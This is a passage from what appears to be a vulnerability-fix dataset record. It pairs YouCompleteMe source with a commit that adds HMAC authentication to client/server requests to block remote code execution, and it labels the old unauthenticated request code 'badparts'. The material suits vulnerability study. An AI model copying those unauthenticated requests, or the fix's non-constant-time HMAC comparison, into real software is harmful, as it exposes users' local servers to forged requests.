hours\n\n\nclass YouCompleteMe( object ):\n  def __init__( self, user_options ):\n    self._user_options = user_options\n    self._user_notified_about_crash = False\n    self._diag_interface = DiagnosticInterface( user_options )\n    self._omnicomp = OmniCompleter( user_options )\n    self._latest_completion_request = None\n    self._latest_file_parse_request = None\n    self._server_stdout = None\n    self._server_stderr = None\n    self._server_popen = None\n    self._filetypes_with_keywords_loaded = set()\n    self._temp_options_filename = None\n    self._ycmd_keepalive = YcmdKeepalive()\n    self._SetupServer()\n    self._ycmd_keepalive.Start()\n\n  def _SetupServer( self ):\n    server_port = utils.GetUnusedLocalhostPort()\n    with tempfile.NamedTemporaryFile( delete = False ) as options_file:\n      self._temp_options_filename = options_file.name\n      json.dump( dict( self._user_options ), options_file )\n      options_file.flush()\n\n      args = [ utils.PathToPythonInterpreter(),\n               _PathToServerScript(),\n               '--port={0}'.format( server_port ),\n               '--options_file={0}'.format( options_file.name ),\n               '--log={0}'.format( self._user_options[ 'server_log_level' ] ),\n               '--idle_suicide_seconds={0}'.format(\n                  SERVER_IDLE_SUICIDE_SECONDS )]\n\n      if not self._user_options[ 'server_use_vim_stdout' ]:\n        filename_format = os.path.join( utils.PathToTempDir(),\n                                        'server_{port}_{std}.log' )\n\n        self._server_stdout = filename_format.format( port = server_port,\n                                                      std = 'stdout' )\n        self._server_stderr = filename_format.format( port = server_port,\n                                                      std = 'stderr' )\n        args.append('--stdout={0}'.format( self._server_stdout ))\n        args.append('--stderr={0}'.format( self._server_stderr ))\n\n        if self._user_options[ 'server_keep_logfiles' ]:\n          args.append('--keep_logfiles')\n\n      self._server_popen = utils.SafePopen( args, stdout = PIPE, stderr = PIPE)\n      BaseRequest.server_location = 'http:\/\/localhost:' + str( server_port )\n\n    self._NotifyUserIfServerCrashed()\n\n  def _IsServerAlive( self ):\n    returncode = self._server_popen.poll()\n    # When the process hasn't finished yet, poll() returns None.\n    return returncode is None\n\n\n  def _NotifyUserIfServerCrashed( self ):\n    if self._user_notified_about_crash or self._IsServerAlive():\n      return\n    self._user_notified_about_crash = True\n    if self._server_stderr:\n      with open( self._server_stderr, 'r' ) as server_stderr_file:\n        error_output = ''.join( server_stderr_file.readlines()[\n            : - NUM_YCMD_STDERR_LINES_ON_CRASH ] )\n        vimsupport.PostMultiLineNotice( SERVER_CRASH_MESSAGE_STDERR_FILE +\n                                        error_output )\n    else:\n        vimsupport.PostVimMessage( SERVER_CRASH_MESSAGE_SAME_STDERR )\n\n\n  def ServerPid( self ):\n    if not self._server_popen:\n      return -1\n    return self._server_popen.pid\n\n\n  def _ServerCleanup( self ):\n    if self._IsServerAlive():\n      self._server_popen.terminate()\n    utils.RemoveIfExists( self._temp_options_filename )\n\n\n  def RestartServer( self ):\n    vimsupport.PostVimMessage( 'Restarting ycmd server...' )\n    self._user_notified_about_crash = False\n    self._ServerCleanup()\n    self._SetupServer()\n\n\n  def CreateCompletionRequest( self, force_semantic = False ):\n    # We have to store a reference to the newly created CompletionRequest\n    # because VimScript can't store a reference to a Python object across\n    # function calls... Thus we need to keep this request somewhere.\n    if ( not self.NativeFiletypeCompletionAvailable() and\n         self.CurrentFiletypeCompletionEnabled() and\n         self._omnicomp.ShouldUseNow() ):\n      self._latest_completion_request = OmniCompletionRequest( self._omnicomp )\n    else:\n      extra_data = {}\n      self._AddExtraConfDataIfNeeded( extra_data )\n      if force_semantic:\n        extra_data[ 'force_semantic' ] = True\n\n      self._latest_completion_request = ( CompletionRequest( extra_data )\n                                          if self._IsServerAlive() else\n                                          None )\n    return self._latest_completion_request\n\n\n  def SendCommandRequest( self, arguments, completer ):\n    if self._IsServerAlive():\n      return SendCommandRequest( arguments, completer )\n\n\n  def GetDefinedSubcommands( self ):\n    if self._IsServerAlive():\n      return BaseRequest.PostDataToHandler( BuildRequestData(),\n                                            'defined_subcommands' )\n    else:\n      return []\n\n\n  def GetCurrentCompletionRequest( self ):\n    return self._latest_completion_request\n\n\n  def GetOmniCompleter( self ):\n    return self._omnicomp\n\n\n  def NativeFiletypeCompletionAvailable( self ):\n    return any( [ FiletypeCompleterExistsForFiletype( x ) for x in\n                  vimsupport.CurrentFiletypes() ] )\n\n\n  def NativeFiletypeCompletionUsable( self ):\n    return ( self.CurrentFiletypeCompletionEnabled() and\n             self.NativeFiletypeCompletionAvailable() )\n\n\n  def OnFileReadyToParse( self ):\n    self._omnicomp.OnFileReadyToParse( None )\n\n    if not self._IsServerAlive():\n      self._NotifyUserIfServerCrashed()\n\n    extra_data = {}\n    self._AddTagsFilesIfNeeded( extra_data )\n    self._AddSyntaxDataIfNeeded( extra_data )\n    self._AddExtraConfDataIfNeeded( extra_data )\n\n    self._latest_file_parse_request = EventNotification( 'FileReadyToParse',\n                                                          extra_data )\n    self._latest_file_parse_request.Start()\n\n\n  def OnBufferUnload( self, deleted_buffer_file ):\n    if not self._IsServerAlive():\n      return\n    SendEventNotificationAsync( 'BufferUnload',\n                                { 'unloaded_buffer': deleted_buffer_file } )\n\n\n  def OnBufferVisit( self ):\n    if not self._IsServerAlive():\n      return\n    extra_data = {}\n    _AddUltiSnipsDataIfNeeded( extra_data )\n    SendEventNotificationAsync( 'BufferVisit', extra_data )\n\n\n  def OnInsertLeave( self ):\n    if not self._IsServerAlive():\n      return\n    SendEventNotificationAsync( 'InsertLeave' )\n\n\n  def OnCursorMoved( self ):\n    self._diag_interface.OnCursorMoved()\n\n\n  def OnVimLeave( self ):\n    self._ServerCleanup()\n\n\n  def OnCurrentIdentifierFinished( self ):\n    if not self._IsServerAlive():\n      return\n    SendEventNotificationAsync( 'CurrentIdentifierFinished' )\n\n\n  def DiagnosticsForCurrentFileReady( self ):\n    return bool( self._latest_file_parse_request and\n                 self._latest_file_parse_request.Done() )\n\n\n  def GetDiagnosticsFromStoredRequest( self, qflist_format = False ):\n    if self.DiagnosticsForCurrentFileReady():\n      diagnostics = self._latest_file_parse_request.Response()\n      # We set the diagnostics request to None because we want to prevent\n      # Syntastic from repeatedly refreshing the buffer with the same diags.\n      # Setting this to None makes DiagnosticsForCurrentFileReady return False\n      # until the next request is created.\n      self._latest_file_parse_request = None\n      if qflist_format:\n        return vimsupport.ConvertDiagnosticsToQfList( diagnostics )\n      else:\n        return diagnostics\n    return []\n\n\n  def UpdateDiagnosticInterface( self ):\n    if not self.DiagnosticsForCurrentFileReady():\n      return\n    self._diag_interface.UpdateWithNewDiagnostics(\n      self.GetDiagnosticsFromStoredRequest() )\n\n\n  def ShowDetailedDiagnostic( self ):\n    if not self._IsServerAlive():\n      return\n    try:\n      debug_info = BaseRequest.PostDataToHandler( BuildRequestData(),\n                                                  'detailed_diagnostic' )\n      if 'message' in debug_info:\n        vimsupport.EchoText( debug_info[ 'message' ] )\n    except ServerError as e:\n      vimsupport.PostVimMessage( str( e ) )\n\n\n  def DebugInfo( self ):\n    if self._IsServerAlive():\n      debug_info = BaseRequest.PostDataToHandler( BuildRequestData(),\n                                                  'debug_info' )\n    else:\n      debug_info = 'Server crashed, no debug info from server'\n    debug_info += '\\nServer running at: {0}'.format(\n        BaseRequest.server_location )\n    debug_info += '\\nServer process ID: {0}'.format( self._server_popen.pid )\n    if self._server_stderr or self._server_stdout:\n      debug_info += '\\nServer logfiles:\\n  {0}\\n  {1}'.format(\n        self._server_stdout,\n        self._server_stderr )\n\n    return debug_info\n\n\n  def CurrentFiletypeCompletionEnabled( self ):\n    filetypes = vimsupport.CurrentFiletypes()\n    filetype_to_disable = self._user_options[\n      'filetype_specific_completion_to_disable' ]\n    return not all([ x in filetype_to_disable for x in filetypes ])\n\n\n  def _AddSyntaxDataIfNeeded( self, extra_data ):\n    if not self._user_options[ 'seed_identifiers_with_syntax' ]:\n      return\n    filetype = vimsupport.CurrentFiletypes()[ 0 ]\n    if filetype in self._filetypes_with_keywords_loaded:\n      return\n\n    self._filetypes_with_keywords_loaded.add( filetype )\n    extra_data[ 'syntax_keywords' ] = list(\n       syntax_parse.SyntaxKeywordsForCurrentBuffer() )\n\n\n  def _AddTagsFilesIfNeeded( self, extra_data ):\n    def GetTagFiles():\n      tag_files = vim.eval( 'tagfiles()' )\n      current_working_directory = os.getcwd()\n      return [ os.path.join( current_working_directory, x ) for x in tag_files ]\n\n    if not self._user_options[ 'collect_identifiers_from_tags_files' ]:\n      return\n    extra_data[ 'tag_files' ] = GetTagFiles()\n\n\n  def _AddExtraConfDataIfNeeded( self, extra_data ):\n    def BuildExtraConfData( extra_conf_vim_data ):\n      return dict( ( expr, vimsupport.VimExpressionToPythonType( expr ) )\n                   for expr in extra_conf_vim_data )\n\n    extra_conf_vim_data = self._user_options[ 'extra_conf_vim_data' ]\n    if extra_conf_vim_data:\n      extra_data[ 'extra_conf_data' ] = BuildExtraConfData(\n        extra_conf_vim_data )\n\n\ndef _PathToServerScript():\n  dir_of_current_script = os.path.dirname( os.path.abspath( __file__ ) )\n  return os.path.join( dir_of_current_script, 'server\/ycmd.py' )\n\n\ndef _AddUltiSnipsDataIfNeeded( extra_data ):\n  if not USE_ULTISNIPS_DATA:\n    return\n\n  try:\n    rawsnips = UltiSnips_Manager._snips( '', 1 )\n  except:\n    return\n\n  # UltiSnips_Manager._snips() returns a class instance where:\n  # class.trigger - name of snippet trigger word ( e.g. defn or testcase )\n  # class.description - description of the snippet\n  extra_data[ 'ultisnips_snippets' ] = [ { 'trigger': x.trigger,\n                                           'description': x.description\n                                         } for x in rawsnips ]\n\n\n"}},"msg":"Client\/server communication now uses HMAC for auth\n\nThis is to prevent a convoluted exploit that can trigger remote code execution."}},"https:\/\/github.com\/rsumner33\/YouCompleteMe":{"e965e0284789e610c0a50d20a92a82ec5c135064":{"url":"https:\/\/api.github.com\/repos\/rsumner33\/YouCompleteMe\/commits\/e965e0284789e610c0a50d20a92a82ec5c135064","html_url":"https:\/\/github.com\/rsumner33\/YouCompleteMe\/commit\/e965e0284789e610c0a50d20a92a82ec5c135064","message":"Client\/server communication now uses HMAC for auth\n\nThis is to prevent a convoluted exploit that can trigger remote code execution.","sha":"e965e0284789e610c0a50d20a92a82ec5c135064","keyword":"remote code execution prevent","diff":"diff --git a\/python\/ycm\/client\/base_request.py b\/python\/ycm\/client\/base_request.py\nindex 7f609727..c9c417f4 100644\n--- a\/python\/ycm\/client\/base_request.py\n+++ b\/python\/ycm\/client\/base_request.py\n@@ -24,6 +24,7 @@\n from requests_futures.sessions import FuturesSession\n from ycm.unsafe_thread_pool_executor import UnsafeThreadPoolExecutor\n from ycm import vimsupport\n+from ycm import utils\n from ycm.utils import ToUtf8Json\n from ycm.server.responses import ServerError, UnknownExtraConf\n \n@@ -31,6 +32,7 @@\n _EXECUTOR = UnsafeThreadPoolExecutor( max_workers = 30 )\n # Setting this to None seems to screw up the Requests\/urllib3 libs.\n _DEFAULT_TIMEOUT_SEC = 30\n+_HMAC_HEADER = 'x-ycm-hmac'\n \n class BaseRequest( object ):\n   def __init__( self ):\n@@ -88,24 +90,28 @@ def _TalkToHandlerAsync( data,\n                            timeout = _DEFAULT_TIMEOUT_SEC ):\n     def SendRequest( data, handler, method, timeout ):\n       if method == 'POST':\n-        return BaseRequest.session.post( _BuildUri( handler ),\n-                                        data = ToUtf8Json( data ),\n-                                        headers = _HEADERS,\n-                                        timeout = timeout )\n+        sent_data = ToUtf8Json( data )\n+        return BaseRequest.session.post(\n+            _BuildUri( handler ),\n+            data = sent_data,\n+            headers = BaseRequest._ExtraHeaders( sent_data ),\n+            timeout = timeout )\n       if method == 'GET':\n-        return BaseRequest.session.get( _BuildUri( handler ),\n-                                        headers = _HEADERS,\n-                                        timeout = timeout )\n+        return BaseRequest.session.get(\n+            _BuildUri( handler ),\n+            headers = BaseRequest._ExtraHeaders(),\n+            timeout = timeout )\n \n     @retries( 5, delay = 0.5, backoff = 1.5 )\n     def DelayedSendRequest( data, handler, method ):\n       if method == 'POST':\n+        sent_data = ToUtf8Json( data )\n         return requests.post( _BuildUri( handler ),\n-                              data = ToUtf8Json( data ),\n-                              headers = _HEADERS )\n+                              data = sent_data,\n+                              headers = BaseRequest._ExtraHeaders( sent_data ) )\n       if method == 'GET':\n         return requests.get( _BuildUri( handler ),\n-                             headers = _HEADERS )\n+                             headers = BaseRequest._ExtraHeaders() )\n \n     if not _CheckServerIsHealthyWithCache():\n       return _EXECUTOR.submit( DelayedSendRequest, data, handler, method )\n@@ -113,8 +119,18 @@ def DelayedSendRequest( data, handler, method ):\n     return SendRequest( data, handler, method, timeout )\n \n \n+  @staticmethod\n+  def _ExtraHeaders( request_body = None ):\n+    if not request_body:\n+      request_body = ''\n+    headers = dict( _HEADERS )\n+    headers[ _HMAC_HEADER ] = utils.CreateHexHmac( request_body,\n+                                                   BaseRequest.hmac_secret )\n+    return headers\n+\n   session = FuturesSession( executor = _EXECUTOR )\n   server_location = 'http:\/\/localhost:6666'\n+  hmac_secret = ''\n \n \n def BuildRequestData( start_column = None,\n@@ -141,6 +157,7 @@ def BuildRequestData( start_column = None,\n \n def JsonFromFuture( future ):\n   response = future.result()\n+  _ValidateResponseObject( response )\n   if response.status_code == requests.codes.server_error:\n     _RaiseExceptionForData( response.json() )\n \n@@ -153,6 +170,13 @@ def JsonFromFuture( future ):\n   return None\n \n \n+def _ValidateResponseObject( response ):\n+  if not utils.ContentHexHmacValid( response.content,\n+                                    response.headers[ _HMAC_HEADER ],\n+                                    BaseRequest.hmac_secret ):\n+    raise RuntimeError( 'Received invalid HMAC for response!' )\n+  return True\n+\n def _BuildUri( handler ):\n   return urlparse.urljoin( BaseRequest.server_location, handler )\n \n@@ -163,7 +187,9 @@ def _CheckServerIsHealthyWithCache():\n   global SERVER_HEALTHY\n \n   def _ServerIsHealthy():\n-    response = requests.get( _BuildUri( 'healthy' ) )\n+    response = requests.get( _BuildUri( 'healthy' ),\n+                             headers = BaseRequest._ExtraHeaders() )\n+    _ValidateResponseObject( response )\n     response.raise_for_status()\n     return response.json()\n \ndiff --git a\/python\/ycm\/server\/hmac_plugin.py b\/python\/ycm\/server\/hmac_plugin.py\nnew file mode 100644\nindex 00000000..b433b2b0\n--- \/dev\/null\n+++ b\/python\/ycm\/server\/hmac_plugin.py\n@@ -0,0 +1,57 @@\n+#!\/usr\/bin\/env python\n+#\n+# Copyright (C) 2014  Google Inc.\n+#\n+# This file is part of YouCompleteMe.\n+#\n+# YouCompleteMe is free software: you can redistribute it and\/or modify\n+# it under the terms of the GNU General Public License as published by\n+# the Free Software Foundation, either version 3 of the License, or\n+# (at your option) any later version.\n+#\n+# YouCompleteMe is distributed in the hope that it will be useful,\n+# but WITHOUT ANY WARRANTY; without even the implied warranty of\n+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n+# GNU General Public License for more details.\n+#\n+# You should have received a copy of the GNU General Public License\n+# along with YouCompleteMe.  If not, see <http:\/\/www.gnu.org\/licenses\/>.\n+\n+import logging\n+import httplib\n+from bottle import request, response, abort\n+from ycm import utils\n+\n+_HMAC_HEADER = 'x-ycm-hmac'\n+\n+# This class implements the Bottle plugin API:\n+# http:\/\/bottlepy.org\/docs\/dev\/plugindev.html\n+#\n+# We want to ensure that every request coming in has a valid HMAC set in the\n+# x-ycm-hmac header and that every response coming out sets such a valid header.\n+# This is to prevent security issues with possible remote code execution.\n+class HmacPlugin( object ):\n+  name = 'hmac'\n+  api = 2\n+\n+\n+  def __init__( self, hmac_secret ):\n+    self._hmac_secret = hmac_secret\n+    self._logger = logging.getLogger( __name__ )\n+\n+\n+  def __call__( self, callback ):\n+    def wrapper( *args, **kwargs ):\n+      body = request.body.read()\n+      if not utils.ContentHexHmacValid( body,\n+                                        request.headers[ _HMAC_HEADER ],\n+                                        self._hmac_secret ):\n+        self._logger.info( 'Dropping request with bad HMAC.' )\n+        abort( httplib.UNAUTHORIZED, 'Unauthorized, received bad HMAC.')\n+        return\n+      body = callback( *args, **kwargs )\n+      response.headers[ _HMAC_HEADER ] = utils.CreateHexHmac(\n+          body, self._hmac_secret )\n+      return body\n+    return wrapper\n+\ndiff --git a\/python\/ycm\/server\/ycmd.py b\/python\/ycm\/server\/ycmd.py\nindex 34e66172..64b0f07f 100755\n--- a\/python\/ycm\/server\/ycmd.py\n+++ b\/python\/ycm\/server\/ycmd.py\n@@ -27,10 +27,12 @@\n import waitress\n import signal\n import os\n+import base64\n from ycm import user_options_store\n from ycm import extra_conf_store\n from ycm import utils\n from ycm.server.watchdog_plugin import WatchdogPlugin\n+from ycm.server.hmac_plugin import HmacPlugin\n \n def YcmCoreSanityCheck():\n   if 'ycm_core' in sys.modules:\n@@ -103,6 +105,8 @@ def Main():\n   options = ( json.load( open( args.options_file, 'r' ) )\n               if args.options_file\n               else user_options_store.DefaultOptions() )\n+  utils.RemoveIfExists( args.options_file )\n+  hmac_secret = base64.b64decode( options[ 'hmac_secret' ] )\n   user_options_store.SetAll( options )\n \n   # This ensures that ycm_core is not loaded before extra conf\n@@ -126,6 +130,7 @@ def Main():\n   handlers.UpdateUserOptions( options )\n   SetUpSignalHandler(args.stdout, args.stderr, args.keep_logfiles)\n   handlers.app.install( WatchdogPlugin( args.idle_suicide_seconds ) )\n+  handlers.app.install( HmacPlugin( hmac_secret ) )\n   waitress.serve( handlers.app,\n                   host = args.host,\n                   port = args.port,\ndiff --git a\/python\/ycm\/utils.py b\/python\/ycm\/utils.py\nindex d9128716..095337c9 100644\n--- a\/python\/ycm\/utils.py\n+++ b\/python\/ycm\/utils.py\n@@ -25,6 +25,8 @@\n import socket\n import stat\n import json\n+import hmac\n+import hashlib\n from distutils.spawn import find_executable\n import subprocess\n import collections\n@@ -212,3 +214,11 @@ def SafePopen( *args, **kwargs ):\n   return subprocess.Popen( *args, **kwargs )\n \n \n+def ContentHexHmacValid( content, hmac, hmac_secret ):\n+  return hmac == CreateHexHmac( content, hmac_secret )\n+\n+\n+def CreateHexHmac( content, hmac_secret ):\n+  return hmac.new( hmac_secret,\n+                   msg = content,\n+                   digestmod = hashlib.sha256 ).hexdigest()\ndiff --git a\/python\/ycm\/youcompleteme.py b\/python\/ycm\/youcompleteme.py\nindex 448236eb..83849ce1 100644\n--- a\/python\/ycm\/youcompleteme.py\n+++ b\/python\/ycm\/youcompleteme.py\n@@ -22,6 +22,7 @@\n import tempfile\n import json\n import signal\n+import base64\n from subprocess import PIPE\n from ycm import vimsupport\n from ycm import utils\n@@ -58,6 +59,7 @@\n # Ctrl-C in Vim.\n signal.signal( signal.SIGINT, signal.SIG_IGN )\n \n+HMAC_SECRET_LENGTH = 16\n NUM_YCMD_STDERR_LINES_ON_CRASH = 30\n SERVER_CRASH_MESSAGE_STDERR_FILE = (\n   'The ycmd server SHUT DOWN (restart with :YcmRestartServer). ' +\n@@ -80,16 +82,18 @@ def __init__( self, user_options ):\n     self._server_stderr = None\n     self._server_popen = None\n     self._filetypes_with_keywords_loaded = set()\n-    self._temp_options_filename = None\n     self._ycmd_keepalive = YcmdKeepalive()\n     self._SetupServer()\n     self._ycmd_keepalive.Start()\n \n   def _SetupServer( self ):\n     server_port = utils.GetUnusedLocalhostPort()\n+    # The temp options file is deleted by ycmd during startup\n     with tempfile.NamedTemporaryFile( delete = False ) as options_file:\n-      self._temp_options_filename = options_file.name\n-      json.dump( dict( self._user_options ), options_file )\n+      hmac_secret = os.urandom( HMAC_SECRET_LENGTH )\n+      options_dict = dict( self._user_options )\n+      options_dict[ 'hmac_secret' ] = base64.b64encode( hmac_secret )\n+      json.dump( options_dict, options_file )\n       options_file.flush()\n \n       args = [ utils.PathToPythonInterpreter(),\n@@ -116,6 +120,7 @@ def _SetupServer( self ):\n \n       self._server_popen = utils.SafePopen( args, stdout = PIPE, stderr = PIPE)\n       BaseRequest.server_location = 'http:\/\/localhost:' + str( server_port )\n+      BaseRequest.hmac_secret = hmac_secret\n \n     self._NotifyUserIfServerCrashed()\n \n@@ -148,7 +153,6 @@ def ServerPid( self ):\n   def _ServerCleanup( self ):\n     if self._IsServerAlive():\n       self._server_popen.terminate()\n-    utils.RemoveIfExists( self._temp_options_filename )\n \n \n   def RestartServer( self ):\n","files":{"\/python\/ycm\/client\/base_request.py":{"changes":[{"diff":"\n                            timeout = _DEFAULT_TIMEOUT_SEC ):\n     def SendRequest( data, handler, method, timeout ):\n       if method == 'POST':\n-        return BaseRequest.session.post( _BuildUri( handler ),\n-                                        data = ToUtf8Json( data ),\n-                                        headers = _HEADERS,\n-                                        timeout = timeout )\n+        sent_data = ToUtf8Json( data )\n+        return BaseRequest.session.post(\n+            _BuildUri( handler ),\n+            data = sent_data,\n+            headers = BaseRequest._ExtraHeaders( sent_data ),\n+            timeout = timeout )\n       if method == 'GET':\n-        return BaseRequest.session.get( _BuildUri( handler ),\n-                                        headers = _HEADERS,\n-                                        timeout = timeout )\n+        return BaseRequest.session.get(\n+            _BuildUri( handler ),\n+            headers = BaseRequest._ExtraHeaders(),\n+            timeout = timeout )\n \n     @retries( 5, delay = 0.5, backoff = 1.5 )\n     def DelayedSendRequest( data, handler, method ):\n       if method == 'POST':\n+        sent_data = ToUtf8Json( data )\n         return requests.post( _BuildUri( handler ),\n-                              data = ToUtf8Json( data ),\n-                              headers = _HEADERS )\n+                              data = sent_data,\n+                              headers = BaseRequest._ExtraHeaders( sent_data ) )\n       if method == 'GET':\n         return requests.get( _BuildUri( handler ),\n-                             headers = _HEADERS )\n+                             headers = BaseRequest._ExtraHeaders() )\n \n     if not _CheckServerIsHealthyWithCache():\n       return _EXECUTOR.submit( DelayedSendRequest, data, handler, method )\n","add":14,"remove":10,"filename":"\/python\/ycm\/client\/base_request.py","badparts":["        return BaseRequest.session.post( _BuildUri( handler ),","                                        data = ToUtf8Json( data ),","                                        headers = _HEADERS,","                                        timeout = timeout )","        return BaseRequest.session.get( _BuildUri( handler ),","                                        headers = _HEADERS,","                                        timeout = timeout )","                              data = ToUtf8Json( data ),","                              headers = _HEADERS )","                             headers = _HEADERS )"],"goodparts":["        sent_data = ToUtf8Json( data )","        return BaseRequest.session.post(","            _BuildUri( handler ),","            data = sent_data,","            headers = BaseRequest._ExtraHeaders( sent_data ),","            timeout = timeout )","        return BaseRequest.session.get(","            _BuildUri( handler ),","            headers = BaseRequest._ExtraHeaders(),","            timeout = timeout )","        sent_data = ToUtf8Json( data )","                              data = sent_data,","                              headers = BaseRequest._ExtraHeaders( sent_data ) )","                             headers = BaseRequest._ExtraHeaders() )"]},{"diff":"\n   global SERVER_HEALTHY\n \n   def _ServerIsHealthy():\n-    response = requests.get( _BuildUri( 'healthy' ) )\n+    response = requests.get( _BuildUri( 'healthy' ),\n+                             headers = BaseRequest._ExtraHeaders() )\n+    _ValidateResponseObject( response )\n     response.raise_for_status()\n     return response.json()\n ","add":3,"remove":1,"filename":"\/python\/ycm\/client\/base_request.py","badparts":["    response = requests.get( _BuildUri( 'healthy' ) )"],"goodparts":["    response = requests.get( _BuildUri( 'healthy' ),","                             headers = BaseRequest._ExtraHeaders() )","    _ValidateResponseObject( response )"]},{"diff":"\n                            timeout = _DEFAULT_TIMEOUT_SEC ):\n     def SendRequest( data, handler, method, timeout ):\n       if method == 'POST':\n-        return BaseRequest.session.post( _BuildUri( handler ),\n-                                        data = ToUtf8Json( data ),\n-                                        headers = _HEADERS,\n-                                        timeout = timeout )\n+        sent_data = ToUtf8Json( data )\n+        return BaseRequest.session.post(\n+            _BuildUri( handler ),\n+            data = sent_data,\n+            headers = BaseRequest._ExtraHeaders( sent_data ),\n+            timeout = timeout )\n       if method == 'GET':\n-        return BaseRequest.session.get( _BuildUri( handler ),\n-                                        headers = _HEADERS,\n-                                        timeout = timeout )\n+        return BaseRequest.session.get(\n+            _BuildUri( handler ),\n+            headers = BaseRequest._ExtraHeaders(),\n+            timeout = timeout )\n \n     @retries( 5, delay = 0.5, backoff = 1.5 )\n     def DelayedSendRequest( data, handler, method ):\n       if method == 'POST':\n+        sent_data = ToUtf8Json( data )\n         return requests.post( _BuildUri( handler ),\n-                              data = ToUtf8Json( data ),\n-                              headers = _HEADERS )\n+                              data = sent_data,\n+                              headers = BaseRequest._ExtraHeaders( sent_data ) )\n       if method == 'GET':\n         return requests.get( _BuildUri( handler ),\n-                             headers = _HEADERS )\n+                             headers = BaseRequest._ExtraHeaders() )\n \n     if not _CheckServerIsHealthyWithCache():\n       return _EXECUTOR.submit( DelayedSendRequest, data, handler, method )\n","add":14,"remove":10,"filename":"\/python\/ycm\/client\/base_request.py","badparts":["        return BaseRequest.session.post( _BuildUri( handler ),","                                        data = ToUtf8Json( data ),","                                        headers = _HEADERS,","                                        timeout = timeout )","        return BaseRequest.session.get( _BuildUri( handler ),","                                        headers = _HEADERS,","                                        timeout = timeout )","                              data = ToUtf8Json( data ),","                              headers = _HEADERS )","                             headers = _HEADERS )"],"goodparts":["        sent_data = ToUtf8Json( data )","        return BaseRequest.session.post(","            _BuildUri( handler ),","            data = sent_data,","            headers = BaseRequest._ExtraHeaders( sent_data ),","            timeout = timeout )","        return BaseRequest.session.get(","            _BuildUri( handler ),","            headers = BaseRequest._ExtraHeaders(),","            timeout = timeout )","        sent_data = ToUtf8Json( data )","                              data = sent_data,","                              headers = BaseRequest._ExtraHeaders( sent_data ) )","                             headers = BaseRequest._ExtraHeaders() )"]},{"diff":"\n   global SERVER_HEALTHY\n \n   def _ServerIsHealthy():\n-    response = requests.get( _BuildUri( 'healthy' ) )\n+    response = requests.get( _BuildUri( 'healthy' ),\n+                             headers = BaseRequest._ExtraHeaders() )\n+    _ValidateResponseObject( response )\n     response.raise_for_status()\n     return response.json()\n ","add":3,"remove":1,"filename":"\/python\/ycm\/client\/base_request.py","badparts":["    response = requests.get( _BuildUri( 'healthy' ) )"],"goodparts":["    response = requests.get( _BuildUri( 'healthy' ),","                             headers = BaseRequest._ExtraHeaders() )","    _ValidateResponseObject( response )"]}],"source":"\n import vim import requests import urlparse from retries import retries from requests_futures.sessions import FuturesSession from ycm.unsafe_thread_pool_executor import UnsafeThreadPoolExecutor from ycm import vimsupport from ycm.utils import ToUtf8Json from ycm.server.responses import ServerError, UnknownExtraConf _HEADERS={'content-type': 'application\/json'} _EXECUTOR=UnsafeThreadPoolExecutor( max_workers=30) _DEFAULT_TIMEOUT_SEC=30 class BaseRequest( object): def __init__( self): pass def Start( self): pass def Done( self): return True def Response( self): return{} @staticmethod def GetDataFromHandler( handler, timeout=_DEFAULT_TIMEOUT_SEC): return JsonFromFuture( BaseRequest._TalkToHandlerAsync( '', handler, 'GET', timeout)) @staticmethod def PostDataToHandler( data, handler, timeout=_DEFAULT_TIMEOUT_SEC): return JsonFromFuture( BaseRequest.PostDataToHandlerAsync( data, handler, timeout)) @staticmethod def PostDataToHandlerAsync( data, handler, timeout=_DEFAULT_TIMEOUT_SEC): return BaseRequest._TalkToHandlerAsync( data, handler, 'POST', timeout) @staticmethod def _TalkToHandlerAsync( data, handler, method, timeout=_DEFAULT_TIMEOUT_SEC): def SendRequest( data, handler, method, timeout): if method=='POST': return BaseRequest.session.post( _BuildUri( handler), data=ToUtf8Json( data), headers=_HEADERS, timeout=timeout) if method=='GET': return BaseRequest.session.get( _BuildUri( handler), headers=_HEADERS, timeout=timeout) @retries( 5, delay=0.5, backoff=1.5) def DelayedSendRequest( data, handler, method): if method=='POST': return requests.post( _BuildUri( handler), data=ToUtf8Json( data), headers=_HEADERS) if method=='GET': return requests.get( _BuildUri( handler), headers=_HEADERS) if not _CheckServerIsHealthyWithCache(): return _EXECUTOR.submit( DelayedSendRequest, data, handler, method) return SendRequest( data, handler, method, timeout) session=FuturesSession( executor=_EXECUTOR) server_location='http:\/\/localhost:6666' def BuildRequestData( start_column=None, query=None, include_buffer_data=True): line, column=vimsupport.CurrentLineAndColumn() filepath=vimsupport.GetCurrentBufferFilepath() request_data={ 'filetypes': vimsupport.CurrentFiletypes(), 'line_num': line, 'column_num': column, 'start_column': start_column, 'line_value': vim.current.line, 'filepath': filepath } if include_buffer_data: request_data[ 'file_data']=vimsupport.GetUnsavedAndCurrentBufferData() if query: request_data[ 'query']=query return request_data def JsonFromFuture( future): response=future.result() if response.status_code==requests.codes.server_error: _RaiseExceptionForData( response.json()) response.raise_for_status() if response.text: return response.json() return None def _BuildUri( handler): return urlparse.urljoin( BaseRequest.server_location, handler) SERVER_HEALTHY=False def _CheckServerIsHealthyWithCache(): global SERVER_HEALTHY def _ServerIsHealthy(): response=requests.get( _BuildUri( 'healthy')) response.raise_for_status() return response.json() if SERVER_HEALTHY: return True try: SERVER_HEALTHY=_ServerIsHealthy() return SERVER_HEALTHY except: return False def _RaiseExceptionForData( data): if data[ 'exception'][ 'TYPE']==UnknownExtraConf.__name__: raise UnknownExtraConf( data[ 'exception'][ 'extra_conf_file']) raise ServerError( '{0}:{1}'.format( data[ 'exception'][ 'TYPE'], data[ 'message'])) ","sourceWithComments":"#!\/usr\/bin\/env python\n#\n# Copyright (C) 2013  Google Inc.\n#\n# This file is part of YouCompleteMe.\n#\n# YouCompleteMe is free software: you can redistribute it and\/or modify\n# it under the terms of the GNU General Public License as published by\n# the Free Software Foundation, either version 3 of the License, or\n# (at your option) any later version.\n#\n# YouCompleteMe is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with YouCompleteMe.  If not, see <http:\/\/www.gnu.org\/licenses\/>.\n\nimport vim\nimport requests\nimport urlparse\nfrom retries import retries\nfrom requests_futures.sessions import FuturesSession\nfrom ycm.unsafe_thread_pool_executor import UnsafeThreadPoolExecutor\nfrom ycm import vimsupport\nfrom ycm.utils import ToUtf8Json\nfrom ycm.server.responses import ServerError, UnknownExtraConf\n\n_HEADERS = {'content-type': 